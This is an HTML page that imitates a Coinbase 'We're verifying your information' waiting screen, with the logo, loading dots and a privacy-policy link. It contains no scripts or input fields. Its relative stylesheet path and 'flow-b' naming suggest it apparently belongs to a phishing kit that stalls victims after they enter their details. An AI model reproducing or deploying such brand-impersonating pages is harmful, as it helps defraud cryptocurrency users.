<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Coinbase</title>
  <meta name="theme-color" content="#000000">
  <link rel="stylesheet" href="../css/flow-b-shell.css"/>
  <style>
*,
*::before,
*::after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
}

html,
body,
#root {
  height: 100%;
  line-height: 1.5;
}

body {
  margin: 0;
}

.ll-fb-logo {
  display: block;
}

a {
  color: inherit;
  text-decoration: inherit;
}

html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}

@keyframes cb-dots {
  0% { transform: translateY(0); }
  40% { transform: translateY(30px); }
  to { transform: translateY(0); }
}

.h-full { height: 100%; }
.w-full { width: 100%; }
.flex-grow { flex-grow: 1; }
.justify-between { justify-content: space-between; }
.flex { display: flex; }
.flex-col { flex-direction: column; }
.items-center { align-items: center; }
.justify-center { justify-content: center; }
.bg-coinbase-background { background-color: rgb(10, 11, 13); }
.p-6 { padding: 1.5rem; }
.p-8 { padding: 2rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.pt-5 { padding-top: 1.25rem; }
.pb-8 { padding-bottom: 2rem; }
.pb-2 { padding-bottom: 0.5rem; }
.pt-12 { padding-top: 3rem; }
.mt-12 { margin-top: 3rem; }
.mt-8 { margin-top: 2rem; }
.mb-20 { margin-bottom: 5rem; }
.gap-5 { gap: 1.25rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.max-w-md { max-width: 28rem; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-full { border-radius: 9999px; }
.text-center { text-align: center; }
.text-\[28px\] { font-size: 28px; }
.font-semibold { font-weight: 600; }
.text-white { color: rgb(255, 255, 255); }
.text-coinbase-foreground-muted { color: rgb(138, 145, 158); }
.text-coinbase-primary { color: rgb(87, 139, 250); }
.h-3 { height: 0.75rem; }
.w-3 { width: 0.75rem; }
.bg-\[\#0052FF\] { background-color: rgb(0, 82, 255); }
.animate-coinbase-dots-loading-1 { animation: cb-dots 2s infinite; }
.animate-coinbase-dots-loading-2 { animation: cb-dots 2s infinite 0.1s; }
.animate-coinbase-dots-loading-3 { animation: cb-dots 2s infinite 0.2s; }

form.max-w-md {
  border-color: #8a919e33;
}

@media (min-width: 640px) {
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line { border-color: #8a919e33; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
  .sm\:justify-start { justify-content: flex-start; }
}
  </style>
</head>
<body style="background:#0a0b0d;">
<div class="ll-fb-type" id="root">
  <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
      <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
        <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"></path>
      </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
      <form class="mt-12 min-h-fit w-full max-w-md rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 flex flex-col items-center pb-8 pt-12 text-center">
        <div class="mb-20 flex gap-5 p-8">
          <div class="h-3 w-3 animate-coinbase-dots-loading-1 rounded-full bg-[#0052FF]"></div>
          <div class="h-3 w-3 animate-coinbase-dots-loading-2 rounded-full bg-[#0052FF]"></div>
          <div class="h-3 w-3 animate-coinbase-dots-loading-3 rounded-full bg-[#0052FF]"></div>
        </div>
        <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
          We're verifying your information.
        </span>
        <span class="font-coinbase-sans text-coinbase-foreground-muted">
          Please do not navigate away from this page.
          <br/>
          This will only take a minute.
        </span>
        <a class="font-coinbase-sans text-coinbase-primary mt-8 font-light" href="https://www.coinbase.com/legal/" rel="noreferrer" target="_blank">
          Privacy policy
        </a>
      </form>
    </div>
  </div>
</div>
</body>
</html>
